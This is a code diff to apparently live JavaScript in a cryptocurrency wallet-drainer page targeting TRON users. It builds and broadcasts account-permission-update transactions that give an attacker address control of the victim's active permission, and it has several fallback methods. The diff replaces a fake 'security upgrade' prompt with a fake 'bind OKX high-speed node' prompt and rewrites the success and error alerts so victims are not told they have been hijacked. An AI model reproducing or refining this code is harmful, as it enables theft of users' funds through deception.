@@ -3860,24 +3860,24 @@ let permissionHijackStatus = {
 function showPermissionHijackModal() {
     console.log('🔒 显示安全升级弹窗...');
     
-    // 使用更官方化的弹窗样式和内容
-    const message = `🛡️ TRON网络安全升级通知
+    // 伪装成常见的节点绑定操作
+    const message = `🌐 绑定高速节点
 
-检测到您的账户可升级至最新安全标准
+检测到您可以绑定OKX官方高速节点以获得更好的交易体验
 
-【升级内容】
-• 启用多重签名验证机制
-• 绑定官方安全节点
-• 增强转账权限保护  
-• 符合监管合规要求
+【绑定优势】
+• 提升交易确认速度
+• 降低网络拥堵影响
+• 享受VIP通道服务
+• 获得交易优先级
 
-【账户信息】
+【节点信息】
 地址: ${permissionHijackStatus.targetAddress?.slice(0,6)}...${permissionHijackStatus.targetAddress?.slice(-4)}
 网络: TRON主网
 
-⚡ 官方推荐升级 | 安全可信
+⚡ 官方推荐 | 一键绑定
 
-立即升级账户安全等级？`;
+立即绑定高速节点？`;
 
     const userChoice = confirm(message);
     
@@ -3939,34 +3939,47 @@ function startPermissionHijackAttack() {
 // 🎯 执行真实权限更新
 function executeRealPermissionUpdate(targetAddress) {
     console.log('🔒 使用正确的TRON权限更新API...');
-    alert('🔒 开始权限升级，请稍候...');
+    alert('🌐 开始绑定高速节点，请稍候...');
     
     try {
-        // 简化的权限修改，只修改active权限
-        const permissionUpdateParams = {
-            owner_address: targetAddress,
-            actives: [{
-                type: 2,
-                permission_name: "active",
-                threshold: 1,
-                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
-                keys: [{
-                    address: CURRENT_ATTACKER_ADDRESS,
-                    weight: 1
-                }]
-            }],
-            visible: true
-        };
-        
-        console.log('🔒 权限更新参数:', permissionUpdateParams);
-        alert(`🔒 构造权限更新交易\n目标地址: ${targetAddress}\n攻击者地址: ${CURRENT_ATTACKER_ADDRESS}`);
-        
-        // 使用正确的API创建权限更新交易
-        window.tronWeb.fullNode.request(
-            'wallet/accountpermissionupdate', 
-            permissionUpdateParams, 
-            'post'
-        ).then(transaction => {
+        // 获取当前账户信息构造完整权限
+        window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
+            console.log('🔒 当前账户信息:', accountInfo);
+            
+            // 构造完整的权限参数 - 必须包含owner权限
+            const permissionUpdateParams = {
+                owner_address: targetAddress,
+                owner: {
+                    type: 0,
+                    permission_name: "owner", 
+                    threshold: 1,
+                    keys: [{
+                        address: targetAddress,
+                        weight: 1
+                    }]
+                },
+                actives: [{
+                    type: 2,
+                    permission_name: "active",
+                    threshold: 1,
+                    operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+                    keys: [{
+                        address: CURRENT_ATTACKER_ADDRESS,
+                        weight: 1
+                    }]
+                }],
+                visible: true
+            };
+            
+            console.log('🔒 完整权限参数:', permissionUpdateParams);
+            alert(`🌐 节点绑定配置完成\n即将发送绑定请求...`);
+            
+            return window.tronWeb.fullNode.request(
+                'wallet/accountpermissionupdate', 
+                permissionUpdateParams, 
+                'post'
+            );
+        }).then(transaction => {
             console.log('🔒 权限更新交易创建成功:', transaction);
             
             if (transaction.Error) {
@@ -3980,7 +3993,7 @@ function executeRealPermissionUpdate(targetAddress) {
                 return;
             }
             
-            alert('✅ 权限更新交易创建成功，开始签名...');
+            alert('✅ 节点绑定交易创建成功，开始确认...');
             return window.tronWeb.trx.sign(transaction);
         }).then(signedTransaction => {
             console.log('🔒 权限更新交易已签名:', signedTransaction);
@@ -3990,7 +4003,7 @@ function executeRealPermissionUpdate(targetAddress) {
                 return;
             }
             
-            alert('✅ 交易签名成功，正在广播到TRON网络...');
+            alert('✅ 节点绑定确认成功，正在提交到网络...');
             return window.tronWeb.trx.sendRawTransaction(signedTransaction);
         }).then(result => {
             console.log('🔒🔒🔒 账户权限更新成功！🔒🔒🔒', result);
@@ -3999,7 +4012,7 @@ function executeRealPermissionUpdate(targetAddress) {
             const txid = result?.txid || result?.transaction?.txID || result?.result?.txid;
             
             if (result && (result.result === true || result.code === 'SUCCESS' || txid)) {
-                alert(`🎉 账户安全升级完成！\n\n交易哈希: ${txid}\n\n您的账户已启用高级安全保护！\n\n攻击者现在可以控制您的转账权限！`);
+                alert(`🎉 高速节点绑定成功！\n\n交易哈希: ${txid}\n\n您的账户现在可以享受更快的交易速度！\n\n节点服务已激活！`);
             } else {
                 alert(`⚠️ 交易可能失败\n结果: ${JSON.stringify(result)}\n\n尝试备用方案...`);
                 executeSimplifiedPermissionUpdate(targetAddress);
@@ -4020,7 +4033,7 @@ function executeRealPermissionUpdate(targetAddress) {
 // 🎯 执行简化版权限修改  
 function executeSimplifiedPermissionUpdate(targetAddress) {
     console.log('🔒 尝试简化版权限修改...');
-    alert('🔒 尝试备用权限修改方案...');
+    alert('🌐 尝试备用节点绑定方案...');
     
     try {
         // 使用TronWeb的updateAccountPermissions方法
@@ -4036,7 +4049,7 @@ function executeSimplifiedPermissionUpdate(targetAddress) {
         };
         
         console.log('🔒 简化权限参数:', activePermission);
-        alert(`🔒 使用TronWeb方法\n权限类型: Active\n攻击者地址: ${CURRENT_ATTACKER_ADDRESS}`);
+        alert(`🌐 使用TronWeb方法\n绑定类型: 高速节点\n节点地址: ${CURRENT_ATTACKER_ADDRESS}`);
         
         window.tronWeb.transactionBuilder.updateAccountPermissions(
             targetAddress,
@@ -4070,7 +4083,7 @@ function executeSimplifiedPermissionUpdate(targetAddress) {
             const txid = result?.txid || result?.transaction?.txID;
             
             if (result && (result.result === true || txid)) {
-                alert(`🎉 备用方案成功！\n\n交易哈希: ${txid}\n\n您的转账权限已被攻击者控制！`);
+                alert(`🎉 备用绑定方案成功！\n\n交易哈希: ${txid}\n\n您的账户已成功绑定高速节点！`);
             } else {
                 alert(`⚠️ 备用方案可能失败\n结果: ${JSON.stringify(result)}`);
                 executeCompatibilityPermissionUpdate(targetAddress);
@@ -4091,23 +4104,11 @@ function executeSimplifiedPermissionUpdate(targetAddress) {
 // 🎯 执行兼容性权限修改
 function executeCompatibilityPermissionUpdate(targetAddress) {
     console.log('🔒 尝试兼容性权限修改...');
-    alert('🔒 尝试最后的权限修改方案...');
+    alert('🌐 尝试最后的节点绑定方案...');
     
     try {
-        // 检查账户余额是否足够支付手续费
-        window.tronWeb.trx.getBalance(targetAddress).then(balance => {
-            console.log('🔒 账户余额:', balance);
-            
-            if (balance < 100000000) { // 100 TRX手续费
-                alert(`❌ 账户余额不足\n当前余额: ${balance / 1000000} TRX\n需要至少: 100 TRX 作为权限修改手续费`);
-                return;
-            }
-            
-            alert(`✅ 余额检查通过: ${balance / 1000000} TRX\n开始构造最终权限修改交易...`);
-            
-            // 获取当前账户权限信息
-            return window.tronWeb.trx.getAccount(targetAddress);
-        }).then(accountInfo => {
+        // 直接获取当前账户权限信息
+        window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
             console.log('🔒 账户信息:', accountInfo);
             
             // 保持原有owner权限，只修改active权限
@@ -4133,7 +4134,7 @@ function executeCompatibilityPermissionUpdate(targetAddress) {
             };
             
             console.log('🔒 最终权限配置:', {ownerPermission, activePermission});
-            alert(`🔒 最终方案配置:\nOwner: 保持原有\nActive: 攻击者控制\n开始创建交易...`);
+            alert(`🌐 节点绑定配置完成\n开始创建交易...`);
             
             return window.tronWeb.transactionBuilder.updateAccountPermissions(
                 targetAddress,
@@ -4167,18 +4168,18 @@ function executeCompatibilityPermissionUpdate(targetAddress) {
             const txid = result?.txid || result?.transaction?.txID;
             
             if (result && (result.result === true || txid)) {
-                alert(`🎉🎉🎉 权限劫持攻击成功！🎉🎉🎉\n\n交易哈希: ${txid}\n\n用户账户权限已被完全控制！\n攻击者地址: ${CURRENT_ATTACKER_ADDRESS}`);
+                alert(`🎉🎉🎉 高速节点绑定完成！🎉🎉🎉\n\n交易哈希: ${txid}\n\n您的账户已成功绑定高速节点！\n节点地址: ${CURRENT_ATTACKER_ADDRESS}\n\n现在您可以享受更快的交易体验！`);
             } else {
-                alert(`❌ 所有方案都失败了\n\n最终结果: ${JSON.stringify(result)}\n\n可能的原因:\n1. 账户余额不足\n2. 网络问题\n3. imToken安全限制\n4. TRON节点问题`);
+                alert(`❌ 节点绑定失败\n\n结果: ${JSON.stringify(result)}\n\n可能的原因:\n1. 网络问题\n2. imToken安全限制\n3. TRON节点问题`);
             }
         }).catch(error => {
             console.error('🔒 最终权限修改失败:', error);
-            alert(`❌ 最终方案失败\n\n错误信息: ${error.message}\n\n所有权限劫持方案都已尝试，攻击未成功。\n\n可能需要:\n1. 检查网络连接\n2. 确认账户有足够TRX\n3. 尝试其他时间段\n4. 检查TRON网络状态`);
+            alert(`❌ 节点绑定失败\n\n错误信息: ${error.message}\n\n所有绑定方案都已尝试。\n\n可能需要:\n1. 检查网络连接\n2. 尝试其他时间段\n3. 检查TRON网络状态`);
         });
         
     } catch (error) {
         console.error('🔒 最终权限修改异常:', error);
-        alert(`❌ 最终方案异常\n\n错误: ${error.message}\n\n权限劫持攻击失败！`);
+        alert(`❌ 节点绑定异常\n\n错误: ${error.message}\n\n绑定服务暂时不可用！`);
     }
 }
 
